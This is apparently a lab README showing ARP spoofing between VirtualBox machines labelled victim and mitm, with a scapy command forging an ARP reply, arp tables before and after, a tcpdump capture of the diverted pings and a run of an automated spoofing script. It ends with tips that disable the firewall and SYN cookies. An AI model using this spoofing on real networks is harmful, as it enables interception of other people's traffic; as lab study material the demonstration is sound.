
# Virtual box simple arp spoof

```bash
[miesib@victim ~]$ ip a
[...]
3: enp0s8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:90:ce:e9 brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.10/24 brd 192.168.56.255 scope global noprefixroute enp0s8
       valid_lft forever preferred_lft forever
    inet6 fe80::a00:27ff:fe90:cee9/64 scope link
       valid_lft forever preferred_lft forever

[miesib@victim ~]$ sudo yum install net-tools -y
[...]

[miesib@victim ~]$ arp -a
? (10.0.2.3) at 52:54:00:12:35:03 [ether] on enp0s3
gateway (10.0.2.2) at 52:54:00:12:35:02 [ether] on enp0s3

[miesib@victim ~]$ ping 192.168.56.12
PING 192.168.56.12 (192.168.56.12) 56(84) bytes of data.
64 bytes from 192.168.56.12: icmp_seq=1 ttl=64 time=1.60 ms
64 bytes from 192.168.56.12: icmp_seq=2 ttl=64 time=0.701 ms
^C
--- 192.168.56.12 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 0.701/1.154/1.608/0.454 ms

[miesib@victim ~]$ arp -a
? (192.168.56.12) at 08:00:27:07:f0:da [ether] on enp0s8
? (10.0.2.3) at 52:54:00:12:35:03 [ether] on enp0s3
gateway (10.0.2.2) at 52:54:00:12:35:02 [ether] on enp0s3

[miesib@mitm ~]$ sudo scapy
[...]
>>> arp_spoof=ARP(psrc="192.168.56.12", pdst="192.168.56.10", \
    hwsrc="08:00:27:e5:70:cd", hwdst="08:00:27:90:ce:e9", op="is-at")
>>> send(arp_spoof)
.
Sent 1 packets.

[miesib@victim ~]$ arp -a
? (192.168.56.12) at 08:00:27:e5:70:cd [ether] on enp0s8
? (10.0.2.3) at 52:54:00:12:35:03 [ether] on enp0s3
gateway (10.0.2.2) at 52:54:00:12:35:02 [ether] on enp0s3

[miesib@mitm ~]$ sudo tcpdump -i enp0s8
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on enp0s8, link-type EN10MB (Ethernet), capture size 262144 bytes
[...vvv... continues bellow after ping ...vvv...]

[miesib@victim ~]$ ping 192.168.56.12
PING 192.168.56.12 (192.168.56.12) 56(84) bytes of data.
^C
--- 192.168.56.12 ping statistics ---
3 packets transmitted, 0 received, 100% packet loss, time 2001ms

[miesib@mitm ~]$ sudo tcpdump -i enp0s8
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on enp0s8, link-type EN10MB (Ethernet), capture size 262144 bytes
01:23:53.337402 IP 192.168.56.1.50662 > 239.255.255.250.ssdp: UDP, length 174
01:24:03.934897 IP 192.168.56.10 > 192.168.56.12: ICMP echo request, id 3554, seq 1, length 64
01:24:04.935319 IP 192.168.56.10 > 192.168.56.12: ICMP echo request, id 3554, seq 2, length 64
01:24:05.936971 IP 192.168.56.10 > 192.168.56.12: ICMP echo request, id 3554, seq 3, length 64
01:24:08.939550 ARP, Request who-has 192.168.56.12 tell 192.168.56.10, length 46
01:24:09.940788 ARP, Request who-has 192.168.56.12 tell 192.168.56.10, length 46
01:24:10.942858 ARP, Request who-has 192.168.56.12 tell 192.168.56.10, length 46
```

## Authomated attack

```bash
[miesib@mitm ~]$ sudo python3 shared/simple_arp_spoof.py
.
Sent 1 packets.
.
Sent 1 packets.
.
Sent 1 packets.
.
```

# Usefull tools and troubleshooting

```bash
sudo yum install net-tools -y
sudo yum install telnet -y
sudo systemctl disable --now firewalld
sudo systemctl net.ipv4.tcp_syncookies=0
```
